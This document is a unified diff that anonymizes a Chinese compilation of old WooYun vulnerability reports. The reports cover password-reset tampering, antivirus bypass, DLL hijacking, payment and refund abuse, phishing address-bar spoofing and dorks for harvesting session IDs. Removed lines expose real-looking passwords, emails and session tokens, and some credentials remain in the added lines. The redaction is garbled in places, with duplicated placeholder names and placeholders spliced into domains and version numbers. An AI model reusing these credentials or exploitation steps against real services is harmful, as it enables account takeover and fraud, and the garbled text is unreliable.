-**详情**: 1、找回密码http://meiqia.com/password/find2、输入手机号13888888888，获取验证码，抓包3、替换返回包false替换为true4、5、密码为wooyun1236、影响大量网站
+**详情**: 1、找回密码https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -25900,7 +25900,7 @@
 
 ---
 ### [wooyun-2013-034450] 杀软防御机制设计不当可导致可能被利用为计算机后门
-**厂商**: 百度 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -25911,7 +25911,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先我在网上找了一个DLL病毒 所有杀软都会报。截图如下我们找到百度杀毒的根目录，看看DLL文件~我们先测试是否可以运行这个病毒，把病毒用文本格式打开，在开头加"cc"字母锁定目标~然后去改刚才的DLL病毒文件名然后运行运行结果打开任务管理器看看豁出去了！把那加的俩字母删掉~再次。。。。再次运行。。运行成功！！！再看看运行之后杀软的防御、主动防御都没有任何提示，自动放行了。
+**详情**: 首先我在网上找了一个DLL病毒 所有杀软都会报。截图如下我们找到某搜索引擎杀毒的根目录，看看DLL文件~我们先测试是否可以运行这个病毒，把病毒用文本格式打开，在开头加"cc"字母锁定目标~然后去改刚才的DLL病毒文件名然后运行运行结果打开任务管理器看看豁出去了！把那加的俩字母删掉~再次。。。。再次运行。。运行成功！！！再看看运行之后杀软的防御、主动防御都没有任何提示，自动放行了。
 
 **POC**: 上面
 
@@ -25965,7 +25965,7 @@
 ---
 
 ---
-### [wooyun-2014-085768] 赛奇网络某处逻辑漏洞导致数站管理员用户密码泄漏（包括域名注册万网,阿里云,Cnss,DZ沦陷,个人博客,PHP站,全权告急）
+### [wooyun-2014-085768] 赛奇网络某处逻辑漏洞导致数站管理员用户密码泄漏（包括域名注册万网,某电商平台,Cnss,DZ沦陷,个人博客,PHP站,全权告急）
 **厂商**: 赛奇网络 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口, 后台管理
@@ -25977,9 +25977,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 是关于赛奇网络的http://0so.so通过访问登录地址：http://saiqi.0so.so/denglu/login.aspx直接访问:http://saiqi.0so.so/denglu/index.aspx?username=%E6%9D%8E%E9%82%B5%E5%90%8C&userpass=123456&userid=1可以发现用户名是李邵同   密码是123456登陆后,可以用户名,这些用户名其实密码都是123456=============================================重要的是,打开账号管理中心可以看到很多地址你其实可以看到了,你懂的,密码全在这里包括网站后台的地址,用户名及管理员密码,全部泄露=-==================================随便打开1个尝试http://booking.mz16.cn/wp-
+**详情**: 是关于赛奇网络的https://example.com/[已脱敏]   密码是123456登陆后,可以用户名,这些用户名其实密码都是123456=============================================重要的是,打开账号管理中心可以看到很多地址你其实可以看到了,你懂的,密码全在这里包括网站后台的地址,用户名及管理员密码,全部泄露=-==================================随便打开1个尝试https://example.com/[已脱敏]
 
-**POC**: 赛奇优化系统 http://sq.0so.so/client/login.aspx      sq03 123456http://www.cnzz.com/  saiqiruizhi@163.com   sqrz@152346天涯http://bbs.tianya.cn    人品不错2014   sqrzgs1民众健康网  http://www.mz16.cn/cms/adminmz16/admin   qq5076966新闻源管理系统 http://www.ruanwenclub.com/   赛奇网络926 saiqiwangluoE动力 http://biz.edong.com  26
+**POC**: 赛奇优化系统 https://example.com/[已脱敏]      sq03 123456https://example.com/[已脱敏]  saiqiruizhi@163.com   sqrz@152346天涯https://example.com/[已脱敏]    人品不错2014   sqrzgs1民众健康网  https://example.com/[已脱敏]   某互联网公司5076966新闻源管理系统 https://example.com/[已脱敏]   赛奇网络926 saiqiwangluoE动力 https://example.com/[已脱敏]  26
 
 **绕过**: 直接利用
 
@@ -26053,8 +26053,8 @@
 ---
 
 ---
-### [wooyun-2013-037409] 多款腾讯网络游戏DLL劫持（6款游戏）
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-037409] 多款某互联网公司网络游戏DLL劫持（6款游戏）
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -26065,7 +26065,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 游戏：QQ飞车劫持程序：QQSpeed_loader.exe版本：100.0.107.7测试时安装路径C:\OnlineGame\网络游戏\QQ飞车\Releasephysx27\劫持如下不存在的DLL：C:\OnlineGame\网络游戏\QQ飞车\Releasephysx27\networkchs.dllC:\OnlineGame\网络游戏\QQ飞车\Releasephysx27\networkcht.dllC:\OnlineGame\网络游戏\QQ飞车\Releasephysx27\networkloc.dllC:\OnlineGame\网络游戏\QQ飞车\Releasephysx27\externalcontrolchs.dllC:\OnlineGame\网络游戏\QQ飞车\Releasephysx27\externalcontrolcht.dllC:\OnlineGame\网络游
+**详情**: 游戏：某互联网公司飞车劫持程序：某互联网公司Speed_loader.exe版本：[IP已脱敏]测试时安装路径C:\OnlineGame\网络游戏\某互联网公司飞车\Releasephysx27\劫持如下不存在的DLL：C:\OnlineGame\网络游戏\某互联网公司飞车\Releasephysx27\networkchs.dllC:\OnlineGame\网络游戏\某互联网公司飞车\Releasephysx27\networkcht.dllC:\OnlineGame\网络游戏\某互联网公司飞车\Releasephysx27\networkloc.dllC:\OnlineGame\网络游戏\某互联网公司飞车\Releasephysx27\externalcontrolchs.dllC:\OnlineGame\网络游戏\某互联网公司飞车\Releasephysx27\externalcontrolcht.dllC:\OnlineGame\网络游
 
 **POC**: (见原文)
 
@@ -26131,7 +26131,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 工行瑞信http://crm.icbccs.com.cn/login.jsp存在两个问题：0x01.验证码可以绕过用单独抓取验证码图片地址：http://crm.icbccs.com.cn/hsipccweb/random.jsp返回的set-cookie和验证码替换payload中的cookie和对应的验证码(见下图两处箭头所指)。。0x02.弱口令payload中的password部分为base64加密，用弱口令“888888”一会就可以跑出好几个。登录后，可以看到一些银行内部信息。不同的账号权限好像不一样，看到的信息不一样，没有一一去看。
+**详情**: 工行瑞信https://example.com/[已脱敏])。。0x02.弱口令payload中的password部分为base64加密，用弱口令“888888”一会就可以跑出好几个。登录后，可以看到一些银行内部信息。不同的账号权限好像不一样，看到的信息不一样，没有一一去看。
 
 **POC**: (见原文)
 
@@ -26175,9 +26175,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞名称:小米盒子存在逻辑漏洞可被渗透攻击途径:远程地是否需要认证:无需认证机密性:完全地可用性:完全地完整性:完全地攻击复杂度:低影响范围:小米盒子（仅测试了迷你版，版本号如图）小米盒子由于缺乏认证机制，导致小米盒子手机APP（投屏神器）可直接扫描局域网内小米盒子，无需密码认证可直接连接（默认设置）。而小米盒子账号可控制各种智能家居设备，如电器智能开关，手环，摄像头甚至汽车盒子。本案例中通过首先突破家庭WIFI,登陆小米盒子，通过盒子作跳板劫持所有智能家电，偷看主人睡觉监控主人出行，甚至给主人车子开窗。由于小米账号与支付宝绑定，可导致资金损失。由于存在逻辑漏洞，还可以绕过屏幕认证给小米盒子植入后门程序长期潜伏女神周围。漏洞直接影响：小米帐号体系在无线网范围内形同虚设，智能家居（本案例中为小蚂蚁摄像头，智能插座，小米放大器，小米盒子及连接的电视），与小米帐号绑定的淘宝帐号（购买小米产品或购
+**详情**: 漏洞名称:小米盒子存在逻辑漏洞可被渗透攻击途径:远程地是否需要认证:无需认证机密性:完全地可用性:完全地完整性:完全地攻击复杂度:低影响范围:小米盒子（仅测试了迷你版，版本号如图）小米盒子由于缺乏认证机制，导致小米盒子手机APP（投屏神器）可直接扫描局域网内小米盒子，无需密码认证可直接连接（默认设置）。而小米盒子账号可控制各种智能家居设备，如电器智能开关，手环，摄像头甚至汽车盒子。本案例中通过首先突破家庭WIFI,登陆小米盒子，通过盒子作跳板劫持所有智能家电，偷看主人睡觉监控主人出行，甚至给主人车子开窗。由于小米账号与某电商平台绑定，可导致资金损失。由于存在逻辑漏洞，还可以绕过屏幕认证给小米盒子植入后门程序长期潜伏女神周围。漏洞直接影响：小米帐号体系在无线网范围内形同虚设，智能家居（本案例中为小蚂蚁摄像头，智能插座，小米放大器，小米盒子及连接的电视），与小米帐号绑定的某电商平台帐号（购买小米产品或购
 
-**POC**: 一、小米盒子版本号信息二、小米路由器无线WIFI的攻克三、连入局域网后对小米盒子进行攻击四、修改配置植入代码等五、消费小米账户或者绑定的支付宝里面的金钱六、智能家居电器完全沦陷可杀人放火（有智能插座连接电磁炉电饭煲）七、危害扩展之智能手环篇（无法容忍的隐私信息泄漏，危害超过前面的那个摄像头）八、危害扩展之各种汽车盒子*（以可以解锁汽车的图吧盒子为例）八、被测试网络环境九、测试前后路由器日志记录对比
+**POC**: 一、小米盒子版本号信息二、小米路由器无线WIFI的攻克三、连入局域网后对小米盒子进行攻击四、修改配置植入代码等五、消费小米账户或者绑定的某电商平台里面的金钱六、智能家居电器完全沦陷可杀人放火（有智能插座连接电磁炉电饭煲）七、危害扩展之智能手环篇（无法容忍的隐私信息泄漏，危害超过前面的那个摄像头）八、危害扩展之各种汽车盒子*（以可以解锁汽车的图吧盒子为例）八、被测试网络环境九、测试前后路由器日志记录对比
 
 **绕过**: 过滤绕过
 
@@ -26219,7 +26219,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 十一要回家购票了,没时间去车站,看了下我大珠海有没有晚上购票的,然后就搜到了http://www.zhgjjt.com:8888/随便搜了下广州的不错有票发现竟然还是Get请求http://www.zhwsbs.gov.cn:9013/shfw/xhTicket/payCtky2.xhtml?we=1&txtSchLocalCode=0001001&txtSchStationName=%25E9%25A6%2599%25E6%25B4%25B2%25E6%2580%25BB%25E7%25AB%2599&txtSchWaitStCode=102017&txtSchDstNode=10001063&txtSchWaitingRoom=&txtSchDate=2014-09-27&txtSchTime=05:30&txtSchWaitStName=%25E9%25A6%2599%25E6%25
+**详情**: 十一要回家购票了,没时间去车站,看了下我大珠海有没有晚上购票的,然后就搜到了https://example.com/[已脱敏]
 
 **POC**: 同上
 
@@ -26351,7 +26351,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 盖象商城：http://www.g-emall.com/
+**详情**: 盖象商城：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -26375,7 +26375,7 @@
 
 **详情**: 之前笔者曾经通过官方的CNNVD渠道提交过北京市政公交一卡通的充值漏洞，一共提了两个：一个是余额为负的情况下的充值漏洞；另一个是任意充值退款的漏洞。很高兴看到余额为负数的漏洞被修复了，但修复只是界面上进行了屏蔽，修复方法有点勉强吧。另一个较为严重的任意充值退款漏洞在目前的最新版本V1.0.09中仍然存在。由于CNNVD很不给力，迟迟没有给予回复，且漏洞到目前仍然存在，因此决定在乌云平台上公布该漏洞。（漏洞相关厂商：hzt360.com）
 
-**POC**: 1.查看当前公交卡余额11.2元。2.充值，选择金额10元，并提交。3.使用支付宝进行正常交易，并付款成功。4.之后进行写卡操作，并同时对手机通过的流量进行拦截，并在进行到其中某一步的时候丢弃其发向服务器的数据包。5.此时软件提示“验签失败”。6.点击后退按钮，撤销本次充值操作。7.于是温馨提示要退款给我。8.收到短信。9.再次扫描下公交卡，多了10元。后面证明也成功退款到了我的账户，就不截图了。
+**POC**: 1.查看当前公交卡余额11.2元。2.充值，选择金额10元，并提交。3.使用某电商平台进行正常交易，并付款成功。4.之后进行写卡操作，并同时对手机通过的流量进行拦截，并在进行到其中某一步的时候丢弃其发向服务器的数据包。5.此时软件提示“验签失败”。6.点击后退按钮，撤销本次充值操作。7.于是温馨提示要退款给我。8.收到短信。9.再次扫描下公交卡，多了10元。后面证明也成功退款到了我的账户，就不截图了。
 
 **绕过**: 直接利用
 
@@ -26383,8 +26383,8 @@
 ---
 
 ---
-### [wooyun-2015-0144996] 京东金融Android客户端更新URL地址可被劫持
-**厂商**: 京东商城 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-0144996] 某电商平台金融Android客户端更新URL地址可被劫持
+**厂商**: 某电商平台商城 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -26395,9 +26395,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 客户端启动是通过http请求获取最新客户端版本信息，其中含有下载地址URL，攻击者可通过中间人劫持替换服务端返回响应信息中url地址，使得用户手机中安装恶意程序（带有恶意程序的京东金融客户端）。用烂了的攻击场景就是在咖啡厅搞中间人劫持。
+**详情**: 客户端启动是通过http请求获取最新客户端版本信息，其中含有下载地址URL，攻击者可通过中间人劫持替换服务端返回响应信息中url地址，使得用户手机中安装恶意程序（带有恶意程序的某电商平台金融客户端）。用烂了的攻击场景就是在咖啡厅搞中间人劫持。
 
-**POC**: 1.客户端基本信息：下载地址：http://**.**.**.**/helppage/downApp/jrAppPromote.htmlapk  : com.jd.jrapp, 37, 3.1.1, 京东金融apkmd5: 4e9f3114a966c3232d8d0464de663c3a证书 :certmd5: b935fa89dae69096f5cec00045e3daacissuer: C=0086, ST=china, L=Beijing, O=京东金融, OU=京东, CN=金融subject: C=0086, ST=china, L=Beijing, O=京东金融, OU=京东, C
+**POC**: 1.客户端基本信息：下载地址：http://**.**.**.**/helppage/downApp/jrAppPromote.htmlapk  : com.jd.jrapp, 37, 3.1.1, 某电商平台金融apkmd5: 4e9f3114a966c3232d8d0464de663c3a证书 :certmd5: b935fa89dae69096f5cec00045e3daacissuer: C=0086, ST=china, L=Beijing, O=某电商平台金融, OU=某电商平台, CN=金融subject: C=0086, ST=china, L=Beijing, O=某电商平台金融, OU=某电商平台, C
 
 **绕过**: 直接利用
 
@@ -26405,8 +26405,8 @@
 ---
 
 ---
-### [wooyun-2013-047474] 百度Android端某应用存在帐号密码挖掘端口
-**厂商**: 百度 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-047474] 某搜索引擎Android端某应用存在帐号密码挖掘端口
+**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -26417,9 +26417,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百度输入法安卓客户端登录处风控机制不合理，可免验证码无限尝试用户密码。（例如版本V4.0.5.20）且该端口未发现任何风控机制。
+**详情**: 某搜索引擎输入法安卓客户端登录处风控机制不合理，可免验证码无限尝试用户密码。（例如版本V4.0.5.20）且该端口未发现任何风控机制。
 
-**POC**: 该端口部分抓包数据。user为用户名，pass为密码（加密方式同百度其他应用，这里不公开了）。该端口无验证码机制和帐号冻结机制，某些用户可以轻松利用该端口制作软件，达到大量挖掘用户弱密码盗取帐号的目的。
+**POC**: 该端口部分抓包数据。user为用户名，pass为密码（加密方式同某搜索引擎其他应用，这里不公开了）。该端口无验证码机制和帐号冻结机制，某些用户可以轻松利用该端口制作软件，达到大量挖掘用户弱密码盗取帐号的目的。
 
 **绕过**: 直接利用
 
@@ -26428,7 +26428,7 @@
 
 ---
 ### [wooyun-2013-020182] 小木虫论坛支付漏洞
-**厂商**: 小木虫论坛（http://emuch.net/bbs） | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+**厂商**: 小木虫论坛（https://example.com/[已脱敏] | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -26439,7 +26439,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 测试地址http://emuch.net/bbs/viewthread.php?tid=3671011这个时候不要直接点“高速下载”，而是在链接地址后加“&pay=yes”，加了之后的链接如下http://emuch.net/bbs/attachment.php?tid=3671011&aid=9590&pay=yes这个时候下载已经是免费的了。
+**详情**: 测试地址https://example.com/[已脱敏]
 
 **POC**: 逻辑漏洞，给下载页面加验证。
 
@@ -26471,8 +26471,8 @@
 ---
 
 ---
-### [wooyun-2015-0129912] 百度某SDK设计缺陷导致手机敏感信息泄露(IMEI号和地理位置信息等)
-**厂商**: 百度 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-0129912] 某搜索引擎某SDK设计缺陷导致手机敏感信息泄露(IMEI号和地理位置信息等)
+**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -26483,9 +26483,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 0x01 漏洞定位检测发现手机经常有应用会打开7777端口，并且在任意地址监听，于是便一探究竟。原来是百度手机助手（当前最新版）。然而直接在apk逆向后的代码中搜索7777或其16进制表示0x1e61却一无所获。最后发现手机助手apk是在运行的时候动态加载的plugin-deploy.dex打开了该端口。根据线索，发现com.baidu.frontia.FrontiaApplication类对安装包中的plugin.dex解密后动态加载。安装百度手机助手，对应用目录下的plugin.dex进行分析，该文件实际是一个odex文件，需要按如下步骤转换为dexadb pull /data/data/com.baidu.appsearch/app_push_dex/plugin-deploy.dexadb pull /system/framework/java -jar ~/tools/smali
+**详情**: 0x01 漏洞定位检测发现手机经常有应用会打开7777端口，并且在任意地址监听，于是便一探究竟。原来是某搜索引擎手机助手（当前最新版）。然而直接在apk逆向后的代码中搜索7777或其16进制表示0x1e61却一无所获。最后发现手机助手apk是在运行的时候动态加载的plugin-deploy.dex打开了该端口。根据线索，发现com.baidu.frontia.FrontiaApplication类对安装包中的plugin.dex解密后动态加载。安装某搜索引擎手机助手，对应用目录下的plugin.dex进行分析，该文件实际是一个odex文件，需要按如下步骤转换为dexadb pull /data/data/com.baidu.appsearch/app_push_dex/plugin-deploy.dexadb pull /system/framework/java -jar ~/tools/smali
 
-**POC**: 0x03 漏洞证明对于百度手机助手:远程获取手机的IMEI对于熊猫驾信:远程获取手机的地理位置信息上述漏洞也可以本地在127.0.0.1利用，使得本不具备android.permission.READ_PHONE_STATE和android.permission.ACCESS_FINE_LOCATION权限的本地应用读取IMEI和地理位置信息。利用手机的热点功能，在3G/4G内网内扫描，可以批量获取手机的IMEI和地理位置信息，发现许多主机都打开了7777端口。扫描一个C段的结果这样就可以用来追踪某些手机所处的地理位置（需要同时支持geolocation和getcuid接口）试验中也发现，许多
+**POC**: 0x03 漏洞证明对于某搜索引擎手机助手:远程获取手机的IMEI对于熊猫驾信:远程获取手机的地理位置信息上述漏洞也可以本地在127.0.0.1利用，使得本不具备android.permission.READ_PHONE_STATE和android.permission.ACCESS_FINE_LOCATION权限的本地应用读取IMEI和地理位置信息。利用手机的热点功能，在3G/4G内网内扫描，可以批量获取手机的IMEI和地理位置信息，发现许多主机都打开了7777端口。扫描一个C段的结果这样就可以用来追踪某些手机所处的地理位置（需要同时支持geolocation和getcuid接口）试验中也发现，许多
 
 **绕过**: 直接利用
 
@@ -26505,9 +26505,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 事先说明，需要做2个准备。准备1，注册个和你攻击目标比较接近的域名，譬如163.com，你可以去随意注册一个域名，然后开通一个多级域名163.com.system.xxx等等类似。准备2，编辑网页，将title部分设置为：<title>网易安全中心-找回密码</title>这里以网易安全中心为例，访问自己构造好的网页，可以看到实际上地址栏部分被更改为了网易安全中心。国产浏览器大部分受到影响。傲游浏览器：uc浏览器：猎豹浏览器：QQ浏览器：搜狗浏览器：全部统一把title部分解析到了url的地方。除了上面的以外，还有360浏览器，2345浏览器等等。不一一截图了。
+**详情**: 事先说明，需要做2个准备。准备1，注册个和你攻击目标比较接近的域名，譬如163.com，你可以去随意注册一个域名，然后开通一个多级域名163.com.system.xxx等等类似。准备2，编辑网页，将title部分设置为：<title>某互联网公司安全中心-找回密码</title>这里以某互联网公司安全中心为例，访问自己构造好的网页，可以看到实际上地址栏部分被更改为了某互联网公司安全中心。国产浏览器大部分受到影响。傲游浏览器：uc浏览器：猎豹浏览器：某互联网公司浏览器：搜狗浏览器：全部统一把title部分解析到了url的地方。除了上面的以外，还有360浏览器，2345浏览器等等。不一一截图了。
 
-**POC**: 再来看看本身自带的safari浏览器以及chrome是怎么做处理的：再附上zone里头一个白帽子差点被这样技术给骗了的案例：http://zone.wooyun.org/content/18901
+**POC**: 再来看看本身自带的safari浏览器以及chrome是怎么做处理的：再附上zone里头一个白帽子差点被这样技术给骗了的案例：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -26571,7 +26571,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: POST /orderfast_pay_do.asp HTTP/1.1Host: www.dinghuaren.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://www.dinghuaren.com/orderfast_pay.asp?ordercode=DC2015320173949218Cookie: ASPSESSIONIDSCC
+**详情**: POST /orderfast_pay_do.asp HTTP/1.1Host: www.dinghuaren.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: https://example.com/[已脱敏] ASPSESSIONIDSCC
 
 **POC**: (见原文)
 
@@ -26581,8 +26581,8 @@
 ---
 
 ---
-### [wooyun-2013-018982] 新浪微博登录逻辑漏洞导致密码hash成为明文密码
-**厂商**: 新浪微博 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2013-018982] 某社交平台某社交平台登录逻辑漏洞导致密码hash成为明文密码
+**厂商**: 某社交平台某社交平台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口
 
@@ -26593,9 +26593,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 研究了下微博登陆：1，没用https，2，用如下算法加密：SHA1(SHA1(SHA1(password))+servertime+nonc)，3，servertime和nonc由prelogin.php从服务端颁发。微博采用这样方式的动机应该是：1，http性能好又方便，https部署麻烦，支持多终端不方便。所以选择http作为认证协议。2，基于#1的决策，为了防止网络嗅探用户被盗用密码，所以在js中 SHA1(password)，一层不放心，做两层：SHA1(SHA1(password))3，为了防止用户弱口令，加上salt4，为了防止暴力破解，采用salt服务器端颁发的方式基于#1，2，3，4的逻辑链，产生了现在的登录流程和密码加密算法。这样做的隐患是：基于现在的逻辑，微博后端user表中的password只能存储SHA1(password)或者SHA1(SHA1(password)
+**详情**: 研究了下某社交平台登陆：1，没用https，2，用如下算法加密：SHA1(SHA1(SHA1(password))+servertime+nonc)，3，servertime和nonc由prelogin.php从服务端颁发。某社交平台采用这样方式的动机应该是：1，http性能好又方便，https部署麻烦，支持多终端不方便。所以选择http作为认证协议。2，基于#1的决策，为了防止网络嗅探用户被盗用密码，所以在js中 SHA1(password)，一层不放心，做两层：SHA1(SHA1(password))3，为了防止用户弱口令，加上salt4，为了防止暴力破解，采用salt服务器端颁发的方式基于#1，2，3，4的逻辑链，产生了现在的登录流程和密码加密算法。这样做的隐患是：基于现在的逻辑，某社交平台后端user表中的password只能存储SHA1(password)或者SHA1(SHA1(password)
 
-**POC**: 下图为微博前端js中的password加密部分
+**POC**: 下图为某社交平台前端js中的password加密部分
 
 **绕过**: 直接利用
 
@@ -26625,8 +26625,8 @@
 ---
 
 ---
-### [wooyun-2014-061571] QQ空间Android版逻辑缺陷导致隐私泄漏
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2014-061571] 某互联网公司空间Android版逻辑缺陷导致隐私泄漏
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -26637,7 +26637,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: QQ空间Android版对file域下符号链接限制不当，可导致cookie等用户隐私被窃取
+**详情**: 某互联网公司空间Android版对file域下符号链接限制不当，可导致cookie等用户隐私被窃取
 
 **POC**: import android.net.Uri;import android.os.Bundle;import android.app.Activity;import android.content.Intent;public class MainActivity extends Activity {public final static String MY_PKG ="com.example.testqzone";public final static String MY_TMP_DIR ="/data/data/" + MY_PKG + "/tmp/";public final static
 
@@ -26747,7 +26747,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在浏览器模式下打开http://suggestion.baidu.com/su;/1.bat;?wd=&cb=calc||&sid=1440_2031_1945_1788&t=1362056239875然后它会弹出下载的页面。接着下载打开就直接执行这个了，详情还是要看看参考才行呢
+**详情**: 在浏览器模式下打开https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -26835,7 +26835,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 利用方式：inurl:?../passport_loginname=问题参数获得密码：注意看随便打开1个页面尝试记录密码http://www.51job.com/shenzhen?passport_loginname=15575376425&passport_password=zhuben456123&submit=%B5%C7%C2%BC登录再来看看http://www.51job.com/changsha?passport_loginname=2925765132@qq.com&passport_password=qweasd&submit=记录下虽然这里登录密码错误了不过已经获取到邮箱了直接，忘记密码，有可能账户密码也是这个qweasd所以果断登录QQ邮箱，点遗忘重新设置新密码我们已将相关信息发往您的信箱,请稍候检查您的信箱。Email：2925765132@qq.com这里我密码改
+**详情**: 利用方式：inurl:?../passport_loginname=问题参数获得密码：注意看随便打开1个页面尝试记录密码https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -26867,8 +26867,8 @@
 ---
 
 ---
-### [wooyun-2014-081109] 腾讯某业务逻辑控制不严可导致用户在不知情的情况下账号被盗(影响聊天、空间、微博、邮箱等全线业务)
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2014-081109] 某互联网公司某业务逻辑控制不严可导致用户在不知情的情况下账号被盗(影响聊天、空间、某社交平台、邮箱等全线业务)
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 参数注入
 
@@ -26879,9 +26879,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.问题起因，sid这个参数，腾讯很多业务都使用sid单个参数做用户识别，然后还都是get请求，这种模式对于现在的网络安全环境来说，有点2了，而且请求过程也都是非加密的，抓取到通信即可获取，sid的有效期我发现也特别长，即使同一QQ生成多组sid也均会有效，那么下面问题来了？举个例子：(例子来自于搜索引擎抓取到的sid，无需密码即可使用全线业务，真变态，原来还真不知道)site:vip.qq.com inurl:sid=site:qq.com inurl:card/index inurl:sid=site:mc.vip.qq.com inurl:sid=site:qq.com inurl:sid=A还有很多搜索方法，搜索引擎很给力吖有效的sid是24位，都是A开头的，可以从搜索引擎里找到相当一部分有效的。而且搜索引擎抓取的时间都是几个月前，那也就是说sid的有效时间很长，但是有个情况，就是
+**详情**: 1.问题起因，sid这个参数，某互联网公司很多业务都使用sid单个参数做用户识别，然后还都是get请求，这种模式对于现在的网络安全环境来说，有点2了，而且请求过程也都是非加密的，抓取到通信即可获取，sid的有效期我发现也特别长，即使同一某互联网公司生成多组sid也均会有效，那么下面问题来了？举个例子：(例子来自于搜索引擎抓取到的sid，无需密码即可使用全线业务，真变态，原来还真不知道)site:vip.某互联网公司.com inurl:sid=site:某互联网公司.com inurl:card/index inurl:sid=site:mc.vip.某互联网公司.com inurl:sid=site:某互联网公司.com inurl:sid=A还有很多搜索方法，搜索引擎很给力吖有效的sid是24位，都是A开头的，可以从搜索引擎里找到相当一部分有效的。而且搜索引擎抓取的时间都是几个月前，那也就是说sid的有效时间很长，但是有个情况，就是
 
-**POC**: 2.qq业务列表：(下面的sid均来自搜索引擎，当你测试的时候不见的都有效)http://qbar.3g.qq.com/g/qbar/qbar_list.jsp?sid=AcaYiNOTAAwj-34Gt1wL8Jc0http://qbar.3g.qq.com/g/qbar/qbar_list.jsp?sid=ASgc4S73J9ioV2max7BYk_jqhttp://qbar.3g.qq.com/g/qbar/qbar_list.jsp?sid=AcaYiNOTAAwj-34Gt1wL8Jc0http://qbar.3g.qq.com/g/qbar/qbar_list.jsp?sid=AV
+**POC**: 2.某互联网公司业务列表：(下面的sid均来自搜索引擎，当你测试的时候不见的都有效)https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -26901,13 +26901,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 主站登录接口没有防御撞库。对登录接口的调用没有进行限制。经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号主站登陆验证码绕过。验证码只在之前的一步有验证，最后登录的时候没有验证。。这逻辑写的。。。登录数据包如下：POST /doLogin HTTP/1.1Host: my.gfan.comProxy-Connection: keep-aliveContent-Length: 108Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://my.gfan.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit
